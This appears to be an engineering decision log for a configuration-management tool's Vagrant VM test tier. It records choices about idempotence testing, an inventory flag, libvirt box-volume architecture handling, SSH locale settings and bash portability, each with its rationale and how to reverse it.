- [SPIKE-vagrant] 2026-09-09 `make vm-test` runs the playbook **twice and fails unless the second run reports nothing changed and nothing failed**. The second run is the test: a first run reporting `changed` proves only that the operation did something, and an operation that rewrites a correct file on every pass reports `changed` too. The assertion was exercised in both directions against synthetic summary tables (clean, nonzero `changed`, nonzero `failed`, two hosts with only the second bad, and empty input), and empty input fails on purpose — no rows in the summary means nothing ran, which is not a pass. Demonstrated end to end by undoing the playbook's changes on both guests and watching `2 changed` then `0 changed` on each. Reverse: run once and check only the exit status.
- [SPIKE-vagrant] 2026-09-09 **`rustible` gained a global `--inventory <FILE>`**, overriding the workspace's `inventory` setting, and `inventory show`/`check`'s existing `--file` falls back to it. The Vagrant machines' addresses and key paths belong to one developer's disk, so `vagrant up` writes them to `dev/vagrant/hosts.vagrant.kdl`, which is not committed; without the flag the developer had to paste the generated group into `examples/workspace/hosts.kdl` by hand, which is a step people get wrong (I got it wrong while writing this, with a script that matched the group name inside the file's own comment text) and which put one machine's addresses in a committed file. The flag is not new configuration: `rustible.toml` already had `inventory = "..."`, and this is the same setting spelled on the command line. A side effect is that the generated inventory declares no workspace-wide vars, so the run stopped emitting the two `var ... is not declared by this playbook` warnings it had been inheriting from the example inventory. `init` rejects the flag, as it does `--workspace`. Reverse: drop the flag and go back to pasting, or make `make vm-test` splice the block into the committed inventory.
- [SPIKE-vagrant] 2026-09-09 The Vagrantfile **deletes libvirt's box volume when it holds the wrong architecture**, recording which one it holds in `.vagrant/rustible/box-arch`. vagrant-libvirt 0.12.2 builds that volume's name from the box name and version alone, with no architecture (`get_volume_name` in `action/handle_box_image.rb`), and `cloud-image/debian-12` publishes amd64 and arm64 under one name and one version: left alone, the second architecture brought up on a host silently boots the first one's disk. An aarch64 guest handed an amd64 disk finds no `BOOTAA64.EFI`, sits in UEFI forever, and `vagrant up` waits for a DHCP lease that never comes, with no error on any stream — it cost two boots of fifteen and twenty minutes before the pool volume was mounted and found to contain `EFI/BOOT/BOOTX64.EFI`. Switching architectures now costs one local re-upload of ~415 MB; staying on one costs nothing. A volume with no stamp beside it is treated as unknown and replaced, since re-uploading a disk we might not have needed to is the cheap error. Rejected: a second box from another publisher (diverges the two guests' Debian lineage, and the arm64 candidates have double-digit download counts), and a per-architecture storage pool (`handle_storage_pool.rb` refuses any non-`default` pool that does not already exist, making it host setup). Reverse: delete `evict_foreign_box_volume` and require developers to `virsh vol-delete` by hand when they switch.
- [SPIKE-vagrant] 2026-09-09 `config.ssh.extra_args` pins `LC_ALL=C LANG=C` for the connection to the guests. OpenSSH forwards `LC_*` and `LANG` by default and the box generates only `C.UTF-8`, so a developer whose terminal is `en_US.UTF-8` got a seven-line locale complaint from bash and perl on every `vagrant ssh`. Fixing it on the connection rather than generating locales in the guest keeps the guests identical to the published box: a provisioning step that exists only to satisfy the host's settings is a difference between one developer's machines and everyone else's, which is the thing this spike is removing. Reverse: drop the line and run `locale-gen` in a provisioner.
- [SPIKE-vagrant] 2026-09-09 The guests are **Debian 12 on both architectures, and no other distribution**. Same distribution both sides means a difference between the two machines is a difference in architecture and nothing else; the container tier already covers distribution spread (Alpine, Fedora, Ubuntu, Debian). Fedora guests are worth adding the day an operation grows behaviour that differs there. Disk is a copy-on-write overlay over the box, so a fresh guest is under 1 MB and the x86 one was 319 MB after a full run. Reverse: add a third machine to `MACHINES` in the Vagrantfile.
- [SPIKE-vagrant] 2026-09-09 `vm-test.sh` expands its optional host list as `${limit[@]+"${limit[@]}"}` rather than `"${limit[@]}"`. macOS ships bash 3.2.57, where expanding an empty array under `set -u` is an unbound-variable error; bash 5 on Linux allows it. The array is empty whenever no `HOSTS=` is given, which is the default, so the default invocation was broken on exactly half the platforms the machine tier exists to cover, and green on the half it was written on. It is the tier's own argument in miniature, and it is why the script is run on both platforms before it is trusted. Reverse: none wanted.
- [SPIKE-vagrant] 2026-09-09 **Under libvirt only one of the two machines may exist at a time**, and `vagrant up` refuses with the `vagrant destroy` command to run rather than proceeding. The first version of the box-volume fix above deleted the pool volume unconditionally, which was worse than the bug it fixed: each machine's disk is a copy-on-write overlay whose backing file *is* that volume (`qemu-img info --backing-chain` on `vagrant_x86.img` names it), so replacing it left the other machine's overlay on the wrong architecture's blocks. It did not look broken — the running domain held the deleted inode open, and `make vm-test` passed against both machines at once — and it would have come apart at the next `vagrant halt`. Silent disk corruption is a worse failure than the silent hang. The qemu provider on macOS keeps each machine's disk in its own `.vagrant` directory, so both coexist there and the restriction is libvirt's alone. The cost is small: the second architecture is the emulated one, reached deliberately, and destroy-plus-up is a minute. Reverse: drop the `created_machines` check and accept that switching architectures corrupts the machine you left behind.
- [SPIKE-vagrant] 2026-09-09 The Vagrantfile's cross-architecture warning says **40 s to 2 min**, not "many minutes". The original wording was written from two boots that hung for 15 and 20 minutes, which turned out not to be emulation at all but the wrong-architecture box volume above; once that was fixed the slowest cell of the matrix is 103 s, and that one includes a 415 MB box upload. A warning calibrated on a bug teaches developers to expect the wrong thing and to stop trusting the note. Reverse: none wanted.
